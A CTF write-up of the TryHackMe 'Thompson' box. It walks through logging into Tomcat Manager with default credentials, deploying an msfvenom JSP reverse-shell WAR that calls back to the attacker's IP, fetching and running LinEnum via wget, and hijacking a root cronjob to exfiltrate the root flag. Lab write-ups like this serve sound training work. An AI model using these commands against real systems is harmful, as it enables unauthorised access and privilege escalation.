# Thompson — TryHackMe Writeup

**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Boot2Root  
**Date:** 2026-05-10

---

## Summary

Easy boot2root machine from the BSides Guatemala CTF. Apache Tomcat 8.5.5 running on port 8080 with default credentials on the Manager panel. Uploaded a malicious `.war` reverse shell payload to get a foothold. Privilege escalation via a cronjob running as root that executes a writable script in the jack user's home directory.

**Skills covered:** service enumeration, Apache Tomcat exploitation, msfvenom payload generation, reverse shell, cronjob abuse for privesc.

---

## Reconnaissance

```bash
nmap -sV -sC -Pn <IP>
```

![nmap scan](TryHackMe/Thompson/assets/1.png)

|Port|Service|Version|
|---|---|---|
|22/tcp|SSH|OpenSSH 7.2p2 Ubuntu|
|8009/tcp|AJP|Apache Jserv Protocol 1.3|
|8080/tcp|HTTP|Apache Tomcat 8.5.5|

> **Pentesting note:** Port 8009 (AJP) can be interesting in some scenarios (e.g. Ghostcat CVE-2020-1938), but here the attack surface is on 8080. When you see Tomcat, go straight to the Manager panel.

---

## Apache Tomcat — Manager Access

Navigating to `http://<IP>:8080/manager/html` prompts for credentials. Tried default Tomcat credentials:

- `tomcat` / `s3cret` ✅

> **Pentesting note:** Apache Tomcat ships with example credentials documented in its own error pages. When the Manager login fails and redirects to the 403 page, that page itself often contains credential examples in XML format. Always read the full error page before moving on. Default credentials (`tomcat:s3cret`, `admin:admin`, `tomcat:tomcat`) should always be the first attempt on any Tomcat instance.

![Tomcat Manager panel](TryHackMe/Thompson/assets/2.png)

---

## Foothold — Malicious WAR Upload

Tomcat Manager allows deploying `.war` (Web Application Archive) files — a legitimate feature abused to upload a reverse shell.

Generated the payload with msfvenom:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f war > shell.war
```

> **Pentesting note:** The payload must match the target technology. Tomcat runs Java, so the payload has to be Java-based (`java/jsp_shell_reverse_tcp`). A Linux ELF or PHP shell would not execute here.

Started a netcat listener:

```bash
nc -lvnp 4444
```

Uploaded `shell.war` via the Manager's "WAR file to deploy" section. The deployed application appeared in the list as `/shell`.

![shell deployed in Tomcat Manager](TryHackMe/Thompson/assets/3.png)

Clicked `/shell` to trigger execution — received reverse connection on the listener.

Stabilised the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Privilege Escalation — Cronjob Abuse

Downloaded and ran LinEnum for enumeration:

```bash
# On attacker machine
python3 -m http.server 8000

# On victim (from /tmp)
wget http://<YOUR_IP>:8000/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

Checked crontab manually:

```bash
cat /etc/crontab
```

![crontab output](assets/4.png)

Found a cronjob running as root every minute:

```
* * * * * root cd /home/jack && bash id.sh
```

The script `/home/jack/id.sh` is writable by the current user (tomcat). Overwrote it to copy root's flag:

```bash
echo 'cp /root/root.txt /home/jack/root.txt' > id.sh
```

Waited one minute for cron to execute, then read the flag:

```bash
cat /home/jack/root.txt
```

![flags captured](assets/5.png)

---

## Flags

|Flag|Location|
|---|---|
|user.txt|`/home/jack/user.txt`|
|root.txt|`/home/jack/root.txt` (copied by cronjob)|

---

## What I Learned

- **Apache Tomcat = Java payloads:** Tomcat runs Java, so the msfvenom payload must be `java/jsp_shell_reverse_tcp` in `.war` format. Matching payload to target technology is fundamental.
- **Default credentials:** Always try default credentials before anything else on admin panels. Tomcat's own 403 error page hints at the credential format.
- **Cronjob abuse for privesc:** If a script executed by root via cron is writable by a low-privilege user, you control what root runs. Check `/etc/crontab` and `cron.d` early in every privesc enumeration.
- **WAR file deployment as attack vector:** The Tomcat Manager's deploy feature is a legitimate admin tool that becomes a direct shell upload vector when credentials are weak or default.